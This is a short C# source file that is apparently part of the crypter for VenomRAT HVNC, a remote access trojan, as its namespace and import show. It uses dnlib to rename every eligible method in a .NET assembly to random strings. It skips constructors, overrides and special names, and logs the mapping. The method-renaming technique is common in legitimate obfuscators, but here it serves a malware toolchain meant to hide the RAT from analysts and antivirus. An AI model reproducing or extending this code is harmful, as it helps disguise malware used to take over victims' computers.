using System;
using dnlib.DotNet;
using VenomRAT_HVNC.Crypter.Settings;

namespace Client.Obfuscation.SimpleTechObfuscate;

public class Methods
{
    public static void obfuscate_methods(ModuleDef md)
    {
        foreach (var type in md.GetTypes())
        {
            // create method to obfuscation map
            foreach (MethodDef method in type.Methods)
            {
                // empty method check
                if (!method.HasBody) continue;
                // method is a constructor
                if (method.IsConstructor) continue;
                // method overrides another
                if (method.HasOverrides) continue;
                // method has a rtspecialname, VES needs proper name
                if (method.IsRuntimeSpecialName) continue;
                // method foward declaration
                if (method.DeclaringType.IsForwarder) continue;

                string encName = new GenerateKey(10).GenerateStrenghCharacter();
                Console.WriteLine($"{method.Name} -> {encName}");
                method.Name = encName;
            }
        }
    }
}